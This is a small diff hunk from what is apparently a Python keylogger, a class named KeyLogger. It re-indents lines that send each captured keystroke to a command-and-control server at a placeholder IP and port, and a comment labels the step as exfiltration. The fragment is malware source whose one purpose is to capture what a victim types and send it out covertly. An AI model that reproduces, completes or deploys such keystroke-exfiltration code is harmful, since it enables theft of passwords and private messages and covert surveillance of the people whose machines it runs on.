@@ -135,10 +135,10 @@ class KeyLogger:
                     
                     pressed = str(event.Key)
             
-                # Exfiltrate keystroke to a command and control server if desired.
-                cncIP = "0.0.0.0"
-                cncPort = 12345
-                connect_to_server(cncIP, cncPort, pressed)
+            # Exfiltrate keystroke to a command and control server if desired.
+            cncIP = "0.0.0.0"
+            cncPort = 12345
+            connect_to_server(cncIP, cncPort, pressed)
             
             return True
 
